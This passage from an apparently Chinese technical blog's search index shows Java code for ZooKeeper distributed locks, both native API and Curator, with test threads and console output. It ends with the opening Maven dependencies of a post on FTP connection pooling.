class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.zookeeper.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.zookeeper.data.Stat;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributedLock</span> </span>&#123;</span><br><span class="line">    <span class="comment">// zookeeper server 列表</span></span><br><span class="line">    <span class="keyword">private</span> String connectString =</span><br><span class="line">            <span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>;</span><br><span class="line">    <span class="comment">// 超时时间</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sessionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="keyword">private</span> ZooKeeper zk;</span><br><span class="line">    <span class="keyword">private</span> String rootNode = <span class="string">"locks"</span>;</span><br><span class="line">    <span class="keyword">private</span> String subNode = <span class="string">"seq-"</span>;</span><br><span class="line">    <span class="comment">// 当前 client 等待的子节点</span></span><br><span class="line">    <span class="keyword">private</span> String waitPath;</span><br><span class="line">    <span class="comment">//ZooKeeper 连接</span></span><br><span class="line">    <span class="keyword">private</span> CountDownLatch connectLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//ZooKeeper 节点等待</span></span><br><span class="line">    <span class="keyword">private</span> CountDownLatch waitLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 当前 client 创建的子节点</span></span><br><span class="line">    <span class="keyword">private</span> String currentNode;</span><br><span class="line">    <span class="comment">// 和 zk 服务建立连接，并创建根节点</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DistributedLock</span><span class="params">()</span> <span class="keyword">throws</span> IOException,</span></span><br><span class="line"><span class="function">            InterruptedException, KeeperException </span>&#123;</span><br><span class="line">        zk = <span class="keyword">new</span> ZooKeeper(connectString, sessionTimeout, <span class="keyword">new</span></span><br><span class="line">                Watcher() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">process</span><span class="params">(WatchedEvent event)</span> </span>&#123;</span><br><span class="line">                        <span class="comment">// 连接建立时, 打开 latch, 唤醒 wait 在该 latch 上的线程</span></span><br><span class="line">                        <span class="keyword">if</span> (event.getState() ==</span><br><span class="line">                                Event.KeeperState.SyncConnected) &#123;</span><br><span class="line">                            connectLatch.countDown();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 发生了 waitPath 的删除事件</span></span><br><span class="line">                        <span class="keyword">if</span> (event.getType() ==</span><br><span class="line">                                Event.EventType.NodeDeleted &amp;&amp; event.getPath().equals(waitPath))</span><br><span class="line">                        &#123;</span><br><span class="line">                            waitLatch.countDown();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="comment">// 等待连接建立</span></span><br><span class="line">        connectLatch.await();</span><br><span class="line">        <span class="comment">//获取根节点状态</span></span><br><span class="line">        Stat stat = zk.exists(<span class="string">"/"</span> + rootNode, <span class="keyword">false</span>);</span><br><span class="line">        <span class="comment">//如果根节点不存在，则创建根节点，根节点类型为永久节点</span></span><br><span class="line">        <span class="keyword">if</span> (stat == <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"根节点不存在"</span>);</span><br><span class="line">            zk.create(<span class="string">"/"</span> + rootNode, <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>],</span><br><span class="line">                    ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.PERSISTENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 加锁方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zkLock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//在根节点下创建临时顺序节点，返回值为创建的节点路径</span></span><br><span class="line">            currentNode = zk.create(<span class="string">"/"</span> + rootNode + <span class="string">"/"</span> + subNode,</span><br><span class="line">                    <span class="keyword">null</span>, ZooDefs.Ids.OPEN_ACL_UNSAFE,</span><br><span class="line">                    CreateMode.EPHEMERAL_SEQUENTIAL);</span><br><span class="line">            <span class="comment">// wait 一小会, 让结果更清晰一些</span></span><br><span class="line">            Thread.sleep(<span class="number">10</span>);</span><br><span class="line">            <span class="comment">// 注意, 没有必要监听"/locks"的子节点的变化情况  </span></span><br><span class="line">            List&lt;String&gt; childrenNodes = zk.getChildren(<span class="string">"/"</span> +</span><br><span class="line">                    rootNode, <span class="keyword">false</span>);</span><br><span class="line">            <span class="comment">// 列表中只有一个子节点, 那肯定就是 currentNode , 说明</span></span><br><span class="line">            client 获得锁</span><br><span class="line">            <span class="keyword">if</span> (childrenNodes.size() == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//对根节点下的所有临时顺序节点进行从小到大排序</span></span><br><span class="line">                Collections.sort(childrenNodes);</span><br><span class="line">                <span class="comment">//当前节点名称</span></span><br><span class="line">                String thisNode = currentNode.substring((<span class="string">"/"</span> +</span><br><span class="line">                        rootNode + <span class="string">"/"</span>).length());</span><br><span class="line">                <span class="comment">//获取当前节点的位置</span></span><br><span class="line">                <span class="keyword">int</span> index = childrenNodes.indexOf(thisNode);</span><br><span class="line">                <span class="keyword">if</span> (index == -<span class="number">1</span>) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"数据异常"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">// index == 0, 说明 thisNode 在列表中最小, 当前</span></span><br><span class="line">                    client 获得锁</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 获得排名比 currentNode 前 1 位的节点</span></span><br><span class="line">                    <span class="keyword">this</span>.waitPath = <span class="string">"/"</span> + rootNode + <span class="string">"/"</span> +</span><br><span class="line">                            childrenNodes.get(index - <span class="number">1</span>);</span><br><span class="line">                    <span class="comment">// 在 waitPath 上注册监听器, 当 waitPath 被删除时,</span></span><br><span class="line">                    zookeeper 会回调监听器的 process 方法</span><br><span class="line">                    zk.getData(waitPath, <span class="keyword">true</span>, <span class="keyword">new</span> Stat());</span><br><span class="line">                    <span class="comment">//进入等待锁状态</span></span><br><span class="line">                    waitLatch.await();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (KeeperException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 解锁方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">zkUnlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            zk.delete(<span class="keyword">this</span>.currentNode, -<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException | KeeperException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2）分布式锁测试</p><p>（1）创建两个线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.zookeeper.KeeperException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DistributedLockTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">            InterruptedException, IOException, KeeperException </span>&#123;</span><br><span class="line">        <span class="comment">// 创建分布式锁 1</span></span><br><span class="line">        <span class="keyword">final</span> DistributedLock lock1 = <span class="keyword">new</span> DistributedLock();</span><br><span class="line">        <span class="comment">// 创建分布式锁 2</span></span><br><span class="line">        <span class="keyword">final</span> DistributedLock lock2 = <span class="keyword">new</span> DistributedLock();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 获取锁对象</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock1.zkLock();</span><br><span class="line">                    System.out.println(<span class="string">"线程 1 获取锁"</span>);</span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line">                    lock1.zkUnlock();</span><br><span class="line">                    System.out.println(<span class="string">"线程 1 释放锁"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 获取锁对象</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock2.zkLock();</span><br><span class="line">                    System.out.println(<span class="string">"线程 2 获取锁"</span>);</span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line">                    lock2.zkUnlock();</span><br><span class="line">                    System.out.println(<span class="string">"线程 2 释放锁"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（2）观察控制台变化：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">线程 1 获取锁</span><br><span class="line">线程 1 释放锁</span><br><span class="line">线程 2 获取锁</span><br><span class="line">线程 2 释放锁</span><br></pre></td></tr></table></figure><h2 id="Curator-框架实现分布式锁案例"><a href="#Curator-框架实现分布式锁案例" class="headerlink" title="Curator 框架实现分布式锁案例"></a>Curator 框架实现分布式锁案例</h2><p>1）原生的 Java API 开发存在的问题 </p><p>（1）会话连接是异步的，需要自己去处理。比如使用 CountDownLatch</p><p>（2）Watch 需要重复注册，不然就不能生效 </p><p>（3）开发的复杂性还是比较高的 </p><p>（4）不支持多节点删除和创建。需要自己去递归</p><p> 2）Curator 是一个专门解决分布式锁的框架，解决了原生 JavaAPI 开发分布式遇到的问题。 详情请查看官方文档：<a href="https://curator.apache.org/index.html" target="_blank" rel="noopener">https://curator.apache.org/index.html</a> </p><p>3）Curator 案例实操</p><p>（1）添加依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line"> &lt;groupId&gt;org.apache.curator&lt;&#x2F;groupId&gt;</span><br><span class="line"> &lt;artifactId&gt;curator-framework&lt;&#x2F;artifactId&gt;</span><br><span class="line"> &lt;version&gt;4.3.0&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line"> &lt;groupId&gt;org.apache.curator&lt;&#x2F;groupId&gt;</span><br><span class="line"> &lt;artifactId&gt;curator-recipes&lt;&#x2F;artifactId&gt;</span><br><span class="line"> &lt;version&gt;4.3.0&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line"> &lt;groupId&gt;org.apache.curator&lt;&#x2F;groupId&gt;</span><br><span class="line"> &lt;artifactId&gt;curator-client&lt;&#x2F;artifactId&gt;</span><br><span class="line"> &lt;version&gt;4.3.0&lt;&#x2F;version&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure><p>（2）代码实现</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.curator.RetryPolicy;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.CuratorFramework;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.CuratorFrameworkFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.recipes.locks.InterProcessLock;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.framework.recipes.locks.InterProcessMutex;</span><br><span class="line"><span class="keyword">import</span> org.apache.curator.retry.ExponentialBackoffRetry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CuratorLockTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String rootNode = <span class="string">"/locks"</span>;</span><br><span class="line">    <span class="comment">// zookeeper server 列表</span></span><br><span class="line">    <span class="keyword">private</span> String connectString =</span><br><span class="line">            <span class="string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span>;</span><br><span class="line">    <span class="comment">// connection 超时时间</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> connectionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="comment">// session 超时时间</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> sessionTimeout = <span class="number">2000</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> CuratorLockTest().test();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 测试</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建分布式锁 1</span></span><br><span class="line">        <span class="keyword">final</span> InterProcessLock lock1 = <span class="keyword">new</span></span><br><span class="line">                InterProcessMutex(getCuratorFramework(), rootNode);</span><br><span class="line">        <span class="comment">// 创建分布式锁 2</span></span><br><span class="line">        <span class="keyword">final</span> InterProcessLock lock2 = <span class="keyword">new</span></span><br><span class="line">                InterProcessMutex(getCuratorFramework(), rootNode);</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 获取锁对象</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock1.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程 1 获取锁"</span>);</span><br><span class="line">                    <span class="comment">// 测试锁重入</span></span><br><span class="line">                    lock1.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程 1 再次获取锁"</span>);</span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line">                    lock1.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程 1 释放锁"</span>);</span><br><span class="line">                    lock1.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程 1 再次释放锁"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 获取锁对象</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    lock2.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程 2 获取锁"</span>);</span><br><span class="line">                    <span class="comment">// 测试锁重入</span></span><br><span class="line">                    lock2.acquire();</span><br><span class="line">                    System.out.println(<span class="string">"线程 2 再次获取锁"</span>);</span><br><span class="line">                    Thread.sleep(<span class="number">5</span> * <span class="number">1000</span>);</span><br><span class="line">                    lock2.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程 2 释放锁"</span>);</span><br><span class="line">                    lock2.release();</span><br><span class="line">                    System.out.println(<span class="string">"线程 2 再次释放锁"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 分布式锁初始化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> CuratorFramework <span class="title">getCuratorFramework</span> <span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//重试策略，初试时间 3 秒，重试 3 次</span></span><br><span class="line">        RetryPolicy policy = <span class="keyword">new</span> ExponentialBackoffRetry(<span class="number">3000</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="comment">//通过工厂创建 Curator</span></span><br><span class="line">        CuratorFramework client =</span><br><span class="line">                CuratorFrameworkFactory.builder()</span><br><span class="line">                        .connectString(connectString)</span><br><span class="line">                        .connectionTimeoutMs(connectionTimeout)</span><br><span class="line">                        .sessionTimeoutMs(sessionTimeout)</span><br><span class="line">                        .retryPolicy(policy).build();</span><br><span class="line">        <span class="comment">//开启连接</span></span><br><span class="line">        client.start();</span><br><span class="line">        System.out.println(<span class="string">"zookeeper 初始化完成..."</span>);</span><br><span class="line">        <span class="keyword">return</span> client;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（3）观察控制台变化： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">线程 1 获取锁 </span><br><span class="line">线程 1 再次获取锁 </span><br><span class="line">线程 1 释放锁 </span><br><span class="line">线程 1 再次释放锁 </span><br><span class="line">线程 2 获取锁 </span><br><span class="line">线程 2 再次获取锁 </span><br><span class="line">线程 2 释放锁 </span><br><span class="line">线程 2 再次释放锁</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Zookeeperwe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ftp连接池</title>
      <link href="/2021/06/19/ftp%E8%BF%9E%E6%8E%A5%E6%B1%A0/"/>
      <url>/2021/06/19/ftp%E8%BF%9E%E6%8E%A5%E6%B1%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>​    老系统和其他系统对接采用ftp交互(内外网隔离，通过光闸内外网摆渡交互文件.ak)，每次对ftp的操作都是新创建连接消耗较大，于是将ftp池化降低ftp创建的消耗，完成系统优化。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>使用依赖:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-devtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-pool2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-net<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-net<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h4 